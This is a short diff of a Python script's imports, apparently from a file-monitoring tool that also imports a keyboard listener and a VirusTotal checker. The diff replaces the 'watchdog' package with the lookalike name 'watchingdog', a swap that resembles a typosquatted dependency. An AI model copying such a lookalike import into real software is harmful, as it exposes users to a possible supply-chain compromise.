@@ -7,8 +7,8 @@ import datetime
 
 from typing import KeysView
 from pynput.keyboard import Key, Listener
-from watchdog.observers import Observer
-from watchdog.events import PatternMatchingEventHandler
+from watchingdog.observers import Observer
+from watchingdog.events import PatternMatchingEventHandler
 from vt_check import vtChecking
 
 # Global vars used in script
